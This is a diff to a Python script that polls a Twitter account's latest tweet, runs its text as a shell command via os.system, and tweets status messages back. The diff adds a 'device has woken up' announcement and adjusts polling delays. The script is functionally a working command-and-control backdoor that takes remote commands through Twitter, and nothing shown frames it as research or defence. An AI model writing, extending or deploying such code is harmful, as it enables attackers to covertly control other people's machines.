@@ -13,20 +13,24 @@ consumer_key = consumer_key
 consumer_secret = CONSUMER_SECRET_KEY
 access_key = ACCESS_KEY
 access_secret = ACCESS_SECRET_KEY
+auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
+auth.set_access_token(access_key, access_secret)
+api = tweepy.API(auth)
 
-
+updated_status= False
 def get_tweets(username):
 
-
-    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
-    auth.set_access_token(access_key, access_secret)
-    api = tweepy.API(auth)
+    global updated_status
 
 
     number_of_tweets = 1
 
 
     for tweet in tweepy.Cursor(api.user_timeline, screen_name = username).items(number_of_tweets):
+        if (updated_status == False) :
+            tweet_status = "Your Device have woken up"
+            status = api.update_status(status=tweet_status)
+            updated_status = True
 
         tweet = str(tweet)
 
@@ -34,13 +38,11 @@ def get_tweets(username):
         tweetdata = tweetdata.group(1)
         if (tweetdata.find("READY FOR NEXT COMMAND") == -1):
             os.system(tweetdata)
-            tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nSLEEPING FOR 5 MINUTES"
+            tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nREADY FOR NEXT COMMAND"
             status = api.update_status(status=tweet_status)
-            time.sleep(20)
-            tweet_status = "READY FOR NEXT COMMAND"
-            status = api.update_status(status=tweet_status)
+            time.sleep(120)
         else:
-            time.sleep(20)
+            time.sleep(10)
     
 
 
